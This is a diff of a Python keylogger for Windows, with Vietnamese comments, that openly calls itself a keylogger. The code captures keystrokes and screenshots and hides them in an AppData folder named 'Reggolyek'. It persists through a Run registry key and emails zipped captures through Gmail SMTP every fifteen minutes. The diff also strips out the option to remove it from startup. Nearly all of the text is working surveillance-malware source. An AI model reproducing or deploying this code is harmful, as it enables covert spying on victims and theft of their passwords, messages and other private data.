@@ -9,9 +9,6 @@ import keyboard              # Hook keyboard events để capture phím bấm
 import pygetwindow as gw     # Lấy thông tin cửa sổ active để chụp screenshot
 from PIL import ImageGrab    # Chụp screenshot màn hình
 import ctypes                # Gọi Windows API để ẩn console, check uptime
-from ctypes import wintypes  # Windows data types cho ctypes
-import win32gui              # Windows GUI API
-import win32con              # Windows constants
 import win32api              # Windows API functions để check Caps Lock, Shift
 import smtplib               # Gửi email qua SMTP
 import zipfile               # Tạo file zip để nén data trước khi gửi email
@@ -23,7 +20,6 @@ from email import encoders                      # Encode attachments
 from dotenv import load_dotenv                  # Load environment variables từ .env file
 import winreg                # Thao tác với Windows Registry để add startup
 import sys                   # System specific parameters và functions
-import argparse              # Parse command line arguments
 
 # ============================
 # CONFIGURATION CONSTANTS
@@ -40,9 +36,6 @@ AUTO_STARTUP = True    # True: Tự động thêm vào Windows startup
 FORMAT = 0             # 0: Format phím mặc định (readable)
                        # 10: Format decimal codes
                        # 16: Format hexadecimal codes
-                       
-MOUSE_IGNORE = True    # True: Bỏ qua mouse events (không dùng trong code này)
-                       # False: Capture mouse events
                        
 EMAIL_INTERVAL = 15 * 60  # Gửi email mỗi 15 phút (15 * 60 = 900 seconds)
 
@@ -125,7 +118,7 @@ class Keylogger:
         try:
             # Lấy đường dẫn AppData\Local từ environment variable
             # Fallback nếu không có LOCALAPPDATA env var
-            appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
+            appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local')) #Result: C:\Users\{username}\AppData\Local
             
             # Tạo thư mục base trong AppData\Local với tên "Reggolyek"
             self.base_dir = os.path.join(appdata_local, "Reggolyek")
@@ -142,19 +135,11 @@ class Keylogger:
             
         except Exception as e:
             print(f"Error setting up AppData directory: {e}")
-            # Fallback strategy: dùng temp directory nếu AppData fails
-            import tempfile
-            self.base_dir = os.path.join(tempfile.gettempdir(), "Reggolyek")
-            os.makedirs(self.base_dir, exist_ok=True)
-            # Setup lại paths với temp directory
-            self.captured_folder = os.path.join(self.base_dir, "captured")
-            self.logs_folder = os.path.join(self.captured_folder, "logs")
-            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
     
     def load_env_config(self):
         """
         Load cấu hình email từ .env file với multiple fallback locations
-        Tìm kiếm .env file ở nhiều chỗ để đảm bảo tìm được config
+        Tìm kiếm .env file ở Downloads, nếu thích có thể bỏ file env và thay vào file luôn
         """
         global GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL  # Declare global để modify
         
@@ -167,9 +152,6 @@ class Keylogger:
                 os.path.join(self.base_dir, '.env'),  # 1. AppData folder (nơi lưu permanent)
                 os.path.join(downloads_folder, 'Reggolyek', 'keylogger', '.env'),  # 2. Dev folder chính
                 os.path.join(downloads_folder, 'Reggolyek', '.env'),  # 3. Parent folder
-                os.path.join(downloads_folder, '.env'),  # 4. Downloads root
-                os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), '.env'),  # 5. Same as exe/script
-                '.env'  # 6. Current working directory
             ]
             
             # Loop qua các locations để tìm .env file
@@ -223,13 +205,7 @@ class Keylogger:
             os.makedirs(self.logs_folder, exist_ok=True)          # Logs subfolder
             os.makedirs(self.screenshots_folder, exist_ok=True)   # Screenshots subfolder
             
-            # Test write permission bằng cách tạo và xóa file test
-            test_file = os.path.join(self.captured_folder, "test_write.tmp")
-            with open(test_file, 'w') as f:
-                f.write("test")
-            os.remove(test_file)  # Clean up test file
-            
-            print(f"✓ Created folders successfully at: {self.captured_folder}")
+            print(f"Created folders successfully at: {self.captured_folder}")
         except Exception as e:
             print(f"Error creating folders: {e}")
     
@@ -324,7 +300,8 @@ This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
                 print(f"Attached file: {zip_filepath}")
             
             # Gửi email qua Gmail SMTP
-            server = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server
+            server = smtplib.SMTP('smtp.gmail.com', 587)  # Gmail SMTP server, 587: Port cho STARTTLS (secure connection)
+            # Alternative: Port 465 cho SSL, port 25 cho unencrypted
             server.starttls()  # Enable TLS encryption
             server.login(GMAIL_EMAIL, GMAIL_PASSWORD)     # Login với app password
             text = msg.as_string()  # Convert message thành string
@@ -649,7 +626,7 @@ This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
             winreg.SetValueEx(key, "Reggolyek", 0, winreg.REG_SZ, exe_path)
             winreg.CloseKey(key)  # Đóng registry key
             
-            print("✓ Added to Windows startup")
+            print("Added to Windows startup")
             
         except Exception as e:
             print(f"Failed to add to startup: {e}")
@@ -670,7 +647,7 @@ This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
             # Xóa registry entry
             winreg.DeleteValue(key, "Reggolyek")
             winreg.CloseKey(key)
-            print("✓ Removed from startup")
+            print("Removed from startup")
         except:
             pass  # Ignore errors (entry might not exist)
 
@@ -740,26 +717,14 @@ This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
 # ============================
 def main():
     """
-    Entry point với command line argument parsing
+    Entry point đơn giản - chỉ start keylogger
     """
-    # Setup argument parser
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--remove-startup', action='store_true', help='Remove from startup')
-    args = parser.parse_args()
-    
-    # Create keylogger instance
+    # Create keylogger instance và start luôn
     keylogger = Keylogger()
-    
-    # Handle remove startup command
-    if args.remove_startup:
-        keylogger.remove_from_startup()
-        return
-    
-    # Start keylogger normally
     keylogger.start()
 
 # ============================
 # SCRIPT EXECUTION
 # ============================
 if __name__ == "__main__":
-    main()  # Chạy main function khi script được execute directly
+    main()
